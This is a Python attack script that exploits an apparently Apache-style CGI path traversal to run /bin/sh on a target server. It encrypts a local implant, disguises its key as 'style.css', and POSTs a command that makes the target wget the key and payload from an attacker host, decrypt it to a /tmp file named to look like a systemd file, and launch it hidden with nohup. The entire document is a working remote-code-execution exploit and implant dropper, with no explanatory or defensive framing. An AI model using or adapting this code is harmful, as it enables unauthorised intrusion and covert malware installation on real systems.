import requests
import subprocess
import os
import random
import string

# --- Configuration ---
target_ip = "10.37.1.248"
attacker_ip = "10.37.1.249" 
local_binary = "./beachhead"

traversal = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
target_url = f"http://{target_ip}{traversal}"
final_binary = "/tmp/systemd-private-uptime"

session = requests.Session()

def prepare_local_payload():
    """Generates key and encrypts binary locally."""
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    with open("style.css", "w") as f:
        f.write(password)
        
    try:
        subprocess.run([
            "openssl", "enc", "-aes-256-cbc", "-md", "sha256", "-salt", "-pbkdf2",
            "-in", local_binary, "-out", "systemd-private-uptime.enc", "-k", password
        ], check=True, capture_output=True)
        return True
    except Exception as e:
        print(f"[!] Local encryption failed: {e}")
        return False

def deploy():
    if not prepare_local_payload():
        return

    print(f"[*] Executing One-Shot Deployment to {target_ip}...")
    
    combined_cmd = (
        f"wget -q http://{attacker_ip}/style.css -O /tmp/.k; "
        f"wget -q http://{attacker_ip}/systemd-private-uptime.enc -O - | openssl enc -d -aes-256-cbc -md sha256 -pbkdf2 -pass file:/tmp/.k -out {final_binary}; "
        f"rm /tmp/.k; chmod +x {final_binary}; nohup {final_binary} >/dev/null 2>&1 &"
    )

    payload = f"echo Content-Type: text/plain; echo; {combined_cmd}"
    
    try:
        req = requests.Request('POST', target_url, data=payload)
        prepared = req.prepare()
        prepared.url = target_url 
        
        response = session.send(prepared, timeout=15)
        
        if response and response.status_code == 200:
            print("[+] One-shot command sent successfully.")
            print(f"[>] {response.text.strip()}")
        else:
            print(f"[!] Request failed with status: {response.status_code if response else 'No Response'}")

    except Exception as e:
        print(f"[!] Deployment Error: {e}")

if __name__ == "__main__":
    deploy()